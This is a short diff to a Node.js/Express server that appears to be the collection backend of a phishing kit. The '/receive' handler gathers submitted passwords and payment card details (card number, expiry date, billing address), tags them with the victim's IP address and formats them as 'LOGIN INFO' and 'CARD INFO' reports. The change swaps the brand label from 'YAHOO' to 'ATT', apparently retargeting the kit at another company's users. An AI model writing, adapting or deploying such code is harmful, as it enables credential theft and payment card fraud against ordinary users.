@@ -74,7 +74,7 @@ app.post('/receive', async (req, res) => {
 	console.log(myObjects);
 
   if (myObjects.includes('Password')) {
-    message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
                `👤 LOGIN INFO\n\n`;
 
     for (const key of myObjects) {
@@ -101,7 +101,7 @@ res.send(cCard);
   }
 
   if (myObjects.includes('Expiry date') || myObjects.includes('Card Number') || myObjects.includes('Billing Address')) {
-    message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
